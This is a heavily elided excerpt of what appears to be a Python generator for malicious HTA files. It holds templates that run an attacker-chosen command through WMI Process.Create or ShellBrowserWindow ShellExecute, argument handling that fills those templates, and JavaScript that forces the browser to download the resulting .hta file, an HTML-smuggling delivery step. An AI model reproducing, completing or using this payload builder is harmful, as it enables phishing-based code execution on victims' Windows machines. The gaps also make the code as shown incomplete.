...
Sub window_onload
    ...
    Error = Process.Create("{}", {}, objConfig, intProcessID)
    window.close()
end sub
</script>
</head>
...
obj.Document.Application.ShellExecute "{}", {}, "C:\Windows\System32", Null,0
self.close
</script>"""
...
if __name__ == '__main__':
    ...
    if args.key and args.command and args.output and args.payload:
        ...
        if args.payload in ['ShellBrowserWindow', 'WbemScripting.SWbemLocator']:
            command = args.command.split(' ', 1)
            args.command = command[0]
            if len(command) == 2:
            ...
            args.params = 'Null'
        hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, args.params)
...
window.navigator.msSaveBlob(b,fname);else{var f = new File([b], fname, {type:"application/hta"});var a=window.document.createElement("a");a.href=window.URL.createObjectURL(f);a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a)}})
"""
